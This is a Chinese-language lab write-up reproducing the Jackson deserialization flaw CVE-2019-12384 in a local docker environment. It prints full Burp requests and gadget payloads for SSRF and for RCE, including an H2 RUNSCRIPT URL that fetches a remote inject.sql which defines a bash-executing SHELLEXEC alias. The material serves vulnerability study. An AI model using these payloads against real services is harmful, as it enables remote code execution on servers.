# Jackson 远程命令执行漏洞（CVE-2019-12384）

## 漏洞概述

当`Jackson`库对`JSON`进行反序列化的时候，存在反序列化漏洞，控制好反序列化的类，就能触发服务端请求伪造（SSRF）和远程代码执行漏洞（RCE）。
漏洞原理和分析参考：
- [Jackson gadgets - Anatomy of a vulnerability](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html)
- [CVE-2019-12384漏洞分析及复现](https://www.freebuf.com/vuls/209394.html)

## 漏洞环境
运行漏洞环境：
```bash
docker-compose up -d
```
命令执行成功后，需要等待以后，之后访问http://your-ip:8080即可访问jackson的测试页面，GET或POST方式传入POC即可。

## 漏洞复现
### SSRF
bp传入poc：
`["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:tcp://192.168.80.133:4444/~/test"}]`

bp构造POC如下：
```http
POST /fuckme HTTP/1.1
Host: fuck.me:8080
Proxy-Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Referer: http://192.168.80.133:8080/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 169
Content-Type: application/x-www-form-urlencoded

poc=["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:tcp://192.168.80.133:4444/~/test"}]
```
成功收到来自服务器的请求：
![](https://pic.superbed.cn/item/5d57c5ae451253d178b20b89.jpg)
### RCE
bp传入poc：
`["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://192.168.80.133:8080/inject.sql'"}]`

该poc利用此服务器的SSRF漏洞请求恶意文件。

恶意文件inject.sql内容如下：
```
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
        String[] command = {"bash", "-c", cmd};
        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('ping 1.1.1.1')
```

bp中构造POC如下：
```http
POST /fuckme HTTP/1.1
Host: fuck.me:8080
Proxy-Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Referer: http://192.168.80.133:8080/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 169
Content-Type: application/x-www-form-urlencoded

poc=["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://192.168.80.133:8080/inject.sql'"}]
```
![](https://pic.superbed.cn/item/5d57c407451253d178b1f421.jpg)

进入docker容器内部，查看是否存在`ping 1.1.1.1`的进程：
```bash
# 进入容器内部
docker exec -it jackson-fuckme bash
# 查看进程
ps -ef | grep ping
```
![](https://pic.superbed.cn/item/5d57c4ad451253d178b1fd98.jpg)

## 总结
整个利用的过程大概是这样：反序列化->SSRF->RCE

## 参考
- [Jackson gadgets - Anatomy of a vulnerability](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html)
- [CVE-2019-12384漏洞分析及复现](https://www.freebuf.com/vuls/209394.html)
- [Jackson CVE-2019-12384: 反序列化漏洞复现](https://blog.a0xpg.com/index.php/2019/07/23/jackson-cve-2019-12384-fanxuliehualoudongfuxian/)